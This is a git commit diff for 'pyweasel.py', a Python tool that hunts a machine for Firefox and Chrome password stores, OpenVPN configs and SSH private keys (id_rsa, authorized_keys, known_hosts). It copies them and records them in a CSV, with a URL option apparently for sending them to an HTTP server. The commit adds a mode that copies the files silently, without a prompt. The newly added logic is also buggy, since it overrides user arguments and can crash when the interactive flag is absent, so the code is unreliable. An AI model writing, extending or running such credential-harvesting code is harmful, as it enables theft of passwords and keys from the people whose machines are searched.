3948c85822ab0c5d43b72bc4a79f4aa5ab88c3ef
Thibaut SANJUAN <sanjuan.thibaut@gmail.com>
2021-04-08 10:27:31 +0200

    feat: args
    Ajout des arguments input-file et interactive

--- pyweasel.py
+++ pyweasel.py
@@ -7,21 +7,33 @@ from helpers import csv_manager, filemanager
 
 def main(arguments):
     csv_manager.init()  # Initialise le fichier CSV
+    search_files = []
+    # Si l'arguement input_file est défini est n'est pas vide
+    if arguments.input_file and arguments.input_file.strip():
+        input_file = arguments.input_file
+        if os.path.isfile(input_file):  # Si l'argument est un fichier valide
+            # On récupère chaque ligne du fichier et les mets dans un tableau
+            search_files = [line.rstrip() for line in open(input_file)]
 
     # Si l'arguement search_files est défini est n'est pas vide
     if arguments.search_files and arguments.search_files.strip():
-        search_files = arguments.search_files
-        if os.path.isfile(search_files):  # Si l'argument est un fichier valide
-            # On récupère chaque ligne du fichier et les mets dans un tableau
-            search_files = [line.rstrip() for line in open(search_files)]
-        elif ',' in search_files:  # Si la chaine de caractère contient une virgule
-            search_files = search_files.split(',')  # On split la chaine
+        arg_search_files = arguments.search_files
+        if ',' in arg_search_files:  # Si la chaine de caractère contient une virgule
+            search_files = list(set(search_files) | set(arg_search_files.split(',')))  # On split la chaine
         else:
-            search_files = [search_files]  # On met la chaine dans un tableau
-    else:
-        # Valeurs recherchés par default
-        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
+            search_files = list(set(search_files) | {arg_search_files})  # On met la chaine dans un tableau
 
+    # Si aucun args pour la recherche de fichier à été défini on utilise les paramètres par défault
+    if not arguments.input_file or not arguments.search_files:
+        # Valeurs recherchés par default
+        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State', 'authorized_keys', 'id_rsa',
+                        'id_rsa.keystore', 'id_rsa.pub', 'known_hosts']
+        if os.name == "nt":  # Si on est sur windows
+            search_files = [] + search_files
+        elif os.name == "posix":  # Si on est sur posix
+            search_files = [] + search_files
+
+    print(search_files)
     if arguments.contains_text and arguments.contains_text.strip():
         contains_text = arguments.contains_text
         if os.path.isfile(contains_text):
@@ -39,15 +51,18 @@ def main(arguments):
     # Recherche les fichiers
     files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
     # Copie les fichiers
-    string = 'Nous avons trouvé {} fichiers, voulez-vous les copier ? (Oui/Non)'.format(len(files))
-    accept = input(string)
-    if accept.lower() == 'oui':
-        # Ajoute chaque fichiers dans le csv
+    if arguments.interactive or arguments.interactive == 1 or arguments.interactive.lower() == "true":
+        string = 'We found {} files, do you want to copy them?  (Yes/No)'.format(len(files))
+        accept = input(string)
+        if accept.lower() == 'yes' or accept.lower() == 'y':
+            # Ajoute chaque fichiers dans le csv
+            filenames = filemanager.copy_files(files)
+            csv_manager.add_rows(filenames)
+        else:
+            print("Copie interrompue.")
+    else:
         filenames = filemanager.copy_files(files)
         csv_manager.add_rows(filenames)
-    else:
-        print("Copie interrompu.")
-
 
     # Si l'argument url existe et n'est pas vide
     if arguments.url and arguments.url.strip():
@@ -61,10 +76,13 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description='Search files')
     parser.add_argument('--url', dest='url', help='url parameter for http server')
+    parser.add_argument('--input-file', dest='input_file',
+                        help='file with the list of files or extension to search')
     parser.add_argument('--search-files', dest='search_files',
                         help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
     parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
     parser.add_argument('--path', dest='path', help='base directory to find files')
+    parser.add_argument('--interactive', dest='interactive', help='display number of files found')
 
     args = parser.parse_args()
     main(args)
